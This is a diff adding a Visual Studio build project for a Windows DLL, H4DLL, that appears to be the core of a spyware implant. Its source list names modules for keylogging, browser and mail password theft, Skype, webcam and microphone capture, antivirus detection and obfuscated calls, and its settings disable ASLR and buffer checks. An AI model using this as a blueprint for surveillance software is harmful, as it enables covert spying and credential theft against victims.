@@ -1,0 +1,270 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|Win32">
+      <Configuration>Debug</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <ProjectGuid>{B149B0CB-E46F-4CFF-B937-BFAF18860B66}</ProjectGuid>
+    <RootNamespace>H4DLL</RootNamespace>
+    <Keyword>Win32Proj</Keyword>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
+    <CharacterSet>MultiByte</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
+    <CharacterSet>MultiByte</CharacterSet>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings">
+    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.props" />
+  </ImportGroup>
+  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="PropertySheets">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+    <Import Project="$(VCTargetsPath)Microsoft.CPP.UpgradeFromVC70.props" />
+  </ImportGroup>
+  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="PropertySheets">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+    <Import Project="$(VCTargetsPath)Microsoft.CPP.UpgradeFromVC70.props" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <PropertyGroup>
+    <_ProjectFileVersion>10.0.30319.1</_ProjectFileVersion>
+    <OutDir Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">Debug\</OutDir>
+    <IntDir Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">Debug\</IntDir>
+    <LinkIncremental Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">true</LinkIncremental>
+    <OutDir Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Release\</OutDir>
+    <IntDir Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Release\</IntDir>
+    <LinkIncremental Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">false</LinkIncremental>
+    <EmbedManifest Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">false</EmbedManifest>
+    <CodeAnalysisRuleSet Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">AllRules.ruleset</CodeAnalysisRuleSet>
+    <CodeAnalysisRules Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" />
+    <CodeAnalysisRuleAssemblies Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" />
+    <CodeAnalysisRuleSet Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">AllRules.ruleset</CodeAnalysisRuleSet>
+    <CodeAnalysisRules Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" />
+    <CodeAnalysisRuleAssemblies Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" />
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <ClCompile>
+      <Optimization>Disabled</Optimization>
+      <PreprocessorDefinitions>WIN32;_DEBUG;_WINDOWS;_USRDLL;H4DLL_EXPORTS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <MinimalRebuild>true</MinimalRebuild>
+      <BasicRuntimeChecks>EnableFastChecks</BasicRuntimeChecks>
+      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
+      <PrecompiledHeader>
+      </PrecompiledHeader>
+      <WarningLevel>TurnOffAllWarnings</WarningLevel>
+      <DebugInformationFormat>EditAndContinue</DebugInformationFormat>
+    </ClCompile>
+    <Link>
+      <AdditionalDependencies>Ws2_32.lib;Winhttp.lib;Kernel32.lib;Psapi.lib;Winmm.lib;Oleacc.lib;Imagehlp.lib;Crypt32.lib;Vfw32.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <OutputFile>$(OutDir)H4DLL.dll</OutputFile>
+      <ModuleDefinitionFile>H4-DLL.def</ModuleDefinitionFile>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <ProgramDatabaseFile>$(OutDir)H4DLL.pdb</ProgramDatabaseFile>
+      <SubSystem>Windows</SubSystem>
+      <RandomizedBaseAddress>false</RandomizedBaseAddress>
+      <DataExecutionPrevention>
+      </DataExecutionPrevention>
+      <ImportLibrary>$(OutDir)H4DLL.lib</ImportLibrary>
+      <TargetMachine>MachineX86</TargetMachine>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ClCompile>
+      <Optimization>MaxSpeed</Optimization>
+      <InlineFunctionExpansion>OnlyExplicitInline</InlineFunctionExpansion>
+      <OmitFramePointers>true</OmitFramePointers>
+      <AdditionalIncludeDirectories>C:\Programmi\Microsoft Visual Studio 9.0\VC\include\dx;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <PreprocessorDefinitions>WIN32;NDEBUG;_WINDOWS;_USRDLL;H4DLL_EXPORTS;_WIN32_WINNT=_WIN32_WINNT_WINXP;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <StringPooling>true</StringPooling>
+      <ExceptionHandling>Async</ExceptionHandling>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+      <BufferSecurityCheck>false</BufferSecurityCheck>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <PrecompiledHeader>
+      </PrecompiledHeader>
+      <WarningLevel>TurnOffAllWarnings</WarningLevel>
+      <DebugInformationFormat>ProgramDatabase</DebugInformationFormat>
+    </ClCompile>
+    <Link>
+      <AdditionalDependencies>winhttp.lib;WS2_32.lib;shlwapi.lib;Vfw32.lib;oleacc.lib;psapi.lib;Strmiids.lib;gdiplus.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <OutputFile>$(OutDir)H4DLL.dll</OutputFile>
+      <AdditionalLibraryDirectories>%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
+      <ModuleDefinitionFile>H4-DLL.def</ModuleDefinitionFile>
+      <GenerateDebugInformation>false</GenerateDebugInformation>
+      <SubSystem>Windows</SubSystem>
+      <OptimizeReferences>true</OptimizeReferences>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <RandomizedBaseAddress>false</RandomizedBaseAddress>
+      <DataExecutionPrevention>
+      </DataExecutionPrevention>
+      <ImportLibrary>$(OutDir)H4DLL.lib</ImportLibrary>
+      <TargetMachine>MachineX86</TargetMachine>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClCompile Include="AM_Core.cpp" />
+    <ClCompile Include="ASP.cpp" />
+    <ClCompile Include="BitmapCommon.cpp" />
+    <ClCompile Include="DeepFreeze.cpp" />
+    <ClCompile Include="demo_functions.cpp" />
+    <ClCompile Include="explore_directory.cpp" />
+    <ClCompile Include="H4-DLL.cpp" />
+    <ClCompile Include="HM_IMAgent\QMsnLive2011.cpp" />
+    <ClCompile Include="LOG.cpp" />
+    <ClCompile Include="SM_Core.cpp" />
+    <ClCompile Include="status_log.cpp" />
+    <ClCompile Include="UnHookClass.cpp" />
+    <ClCompile Include="x64.cpp" />
+    <ClCompile Include="aes_alg.cpp" />
+    <ClCompile Include="md5.cpp" />
+    <ClCompile Include="sha1.cpp" />
+    <ClCompile Include="HM_IMAgent\QAgent.cpp" />
+    <ClCompile Include="HM_IMAgent\QIcq.cpp" />
+    <ClCompile Include="HM_IMAgent\QIcq7.cpp" />
+    <ClCompile Include="HM_IMAgent\QList.cpp" />
+    <ClCompile Include="HM_IMAgent\QMessengerAgent.cpp" />
+    <ClCompile Include="HM_IMAgent\QMsn.cpp" />
+    <ClCompile Include="HM_IMAgent\QMsn6.cpp" />
+    <ClCompile Include="HM_IMAgent\QMsnLive.cpp" />
+    <ClCompile Include="HM_IMAgent\QMsnLive2009.cpp" />
+    <ClCompile Include="HM_IMAgent\QMsnLive85.cpp" />
+    <ClCompile Include="HM_IMAgent\QOleWalker.cpp" />
+    <ClCompile Include="HM_IMAgent\QProperty.cpp" />
+    <ClCompile Include="HM_IMAgent\QYim.cpp" />
+    <ClCompile Include="HM_IMAgent\QYim10.cpp" />
+    <ClCompile Include="HM_IMAgent\QYim7.cpp" />
+    <ClCompile Include="HM_IMAgent\QYim8.cpp" />
+    <ClCompile Include="HM_IMAgent\QYim9.cpp" />
+    <ClCompile Include="HM_CodeAlign.cpp" />
+    <ClCompile Include="HM_PreamblePatch.cpp" />
+    <ClCompile Include="HM_Reloc.cpp" />
+    <ClCompile Include="HM_SafeProcedures.cpp" />
+    <ClCompile Include="HM_MicAgent\QAmbientalMicrophone.cpp" />
+    <ClCompile Include="HM_MicAgent\QSpeechDetect.cpp" />
+    <ClCompile Include="HM_MicAgent\QVistaMicrophone.cpp" />
+    <ClCompile Include="HM_MicAgent\XpMic.cpp" />
+    <ClCompile Include="HM_PWDAgent\base64.cpp" />
+    <ClCompile Include="HM_PWDAgent\chrome.cpp" />
+    <ClCompile Include="HM_PWDAgent\des.cpp" />
+    <ClCompile Include="HM_PWDAgent\firefox.cpp" />
+    <ClCompile Include="HM_PWDAgent\gtalk.cpp" />
+    <ClCompile Include="HM_PWDAgent\iexplorer.cpp" />
+    <ClCompile Include="HM_PWDAgent\msn.cpp" />
+    <ClCompile Include="HM_PWDAgent\opera.cpp" />
+    <ClCompile Include="HM_PWDAgent\outlook.cpp" />
+    <ClCompile Include="HM_PWDAgent\paltalk.cpp" />
+    <ClCompile Include="HM_PWDAgent\thunderbird.cpp" />
+    <ClCompile Include="HM_PWDAgent\trillian.cpp" />
+    <ClCompile Include="HM_MailAgent\OLMAPI.cpp" />
+    <ClCompile Include="HM_MailAgent\WindowsMail.cpp" />
+    <ClCompile Include="HM_ContactAgent\OLABMAPI.cpp" />
+    <ClCompile Include="wcam_grab.cpp" />
+    <ClCompile Include="DynamiCall\dynamic_import.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="H4-DLL.def" />
+  </ItemGroup>
+  <ItemGroup>
+    <MASM Include="procedures.asm" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="aes_alg.h" />
+    <ClInclude Include="HM_IMAgent\QMsnLive2011.h" />
+    <ClInclude Include="md5.h" />
+    <ClInclude Include="sha1.h" />
+    <ClInclude Include="HM_IMAgent\QAgent.h" />
+    <ClInclude Include="HM_IMAgent\QIcq.h" />
+    <ClInclude Include="HM_IMAgent\QIcq7.h" />
+    <ClInclude Include="HM_IMAgent\QList.h" />
+    <ClInclude Include="HM_IMAgent\QMessengerAgent.h" />
+    <ClInclude Include="HM_IMAgent\QMsn.h" />
+    <ClInclude Include="HM_IMAgent\QMsn6.h" />
+    <ClInclude Include="HM_IMAgent\QMsnLive.h" />
+    <ClInclude Include="HM_IMAgent\QMsnLive2009.h" />
+    <ClInclude Include="HM_IMAgent\QMsnLive85.h" />
+    <ClInclude Include="HM_IMAgent\QOleWalker.h" />
+    <ClInclude Include="HM_IMAgent\QProperty.h" />
+    <ClInclude Include="HM_IMAgent\QYim.h" />
+    <ClInclude Include="HM_IMAgent\QYim10.h" />
+    <ClInclude Include="HM_IMAgent\QYim7.h" />
+    <ClInclude Include="HM_IMAgent\QYim8.h" />
+    <ClInclude Include="HM_IMAgent\QYim9.h" />
+    <ClInclude Include="HM_PreamblePatch.h" />
+    <ClInclude Include="HM_Reloc.h" />
+    <ClInclude Include="HM_SafeProcedures.h" />
+    <ClInclude Include="HM_MicAgent\QAmbientalMicrophone.h" />
+    <ClInclude Include="HM_MicAgent\QSpeechDetect.h" />
+    <ClInclude Include="HM_MicAgent\QVistaMicrophone.h" />
+    <ClInclude Include="HM_MicAgent\XpMic.h" />
+    <ClInclude Include="HM_PWDAgent\base64.h" />
+    <ClInclude Include="HM_PWDAgent\des.h" />
+    <ClInclude Include="HM_MailAgent\MailAgent.h" />
+    <ClInclude Include="HM_ContactAgent\OLABMAPI.h" />
+    <ClInclude Include="DynamiCall\dynamic_import.h" />
+    <ClInclude Include="DynamiCall\obfuscated_calls.h" />
+    <ClInclude Include="DynamiCall\prototypes.h" />
+    <ClInclude Include="AM_Core.h" />
+    <ClInclude Include="ASP.h" />
+    <ClInclude Include="av_detect.h" />
+    <ClInclude Include="bin_string.h" />
+    <ClInclude Include="cert.h" />
+    <ClInclude Include="common.h" />
+    <ClInclude Include="DeepFreeze.h" />
+    <ClInclude Include="demo_functions.h" />
+    <ClInclude Include="exceptions.h" />
+    <ClInclude Include="explore_directory.h" />
+    <ClInclude Include="H4-DLL.h" />
+    <ClInclude Include="HM_BitmapCommon.h" />
+    <ClInclude Include="HM_CodeAlign.h" />
+    <ClInclude Include="HM_HooksSystemStruct.h" />
+    <ClInclude Include="HM_InbundleHook.h" />
+    <ClInclude Include="HM_IpcModule.h" />
+    <ClInclude Include="HM_VistaSpecific.h" />
+    <ClInclude Include="LOG.h" />
+    <ClInclude Include="PEB.h" />
+    <ClInclude Include="resource1.h" />
+    <ClInclude Include="SM_ActionFunctions.h" />
+    <ClInclude Include="SM_Core.h" />
+    <ClInclude Include="SM_EventHandlers.h" />
+    <ClInclude Include="status_log.h" />
+    <ClInclude Include="UnHookClass.h" />
+    <ClInclude Include="x64.h" />
+    <ClInclude Include="HM_AmbMic.h" />
+    <ClInclude Include="HM_Application.h" />
+    <ClInclude Include="HM_ClipBoard.h" />
+    <ClInclude Include="HM_Contacts.h" />
+    <ClInclude Include="HM_CrisisAgent.h" />
+    <ClInclude Include="HM_IMAgent.h" />
+    <ClInclude Include="HM_KeyLog.h" />
+    <ClInclude Include="HM_LogDevice.h" />
+    <ClInclude Include="HM_MailCap.h" />
+    <ClInclude Include="HM_MouseLog.h" />
+    <ClInclude Include="HM_PDAAgent.h" />
+    <ClInclude Include="HM_PrintPool.h" />
+    <ClInclude Include="HM_ProcessMonitors.h" />
+    <ClInclude Include="HM_Pstorage.h" />
+    <ClInclude Include="HM_SkypeRecord.h" />
+    <ClInclude Include="HM_SnapShot.h" />
+    <ClInclude Include="HM_UrlLog.h" />
+    <ClInclude Include="HM_WebCam.h" />
+    <ClInclude Include="HM_WiFiLocation.h" />
+  </ItemGroup>
+  <ItemGroup>
+    <ResourceCompile Include="H4DLL1.rc" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.targets" />
+  </ImportGroup>
+</Project>
